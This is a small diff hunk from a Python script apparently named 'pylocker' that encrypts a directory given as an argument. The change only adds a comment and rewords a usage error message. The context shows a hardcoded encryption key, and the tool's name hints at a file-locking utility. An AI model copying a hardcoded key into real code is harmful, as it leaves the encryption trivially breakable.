@@ -75,8 +75,8 @@ def main():
 
 	key = b'sixteenbytekeyzz'
 
-	if len(sys.argv) != 2:
-		print("Error, \n\t Example ./pylocker dir_to_encrypt")
+	if len(sys.argv) != 2: #Checking if an argument has been provided.
+		print("[Error]\n\t Example ./pylocker dir_to_encrypt")
 		sys.exit()
 
 	mypath = argv[1]
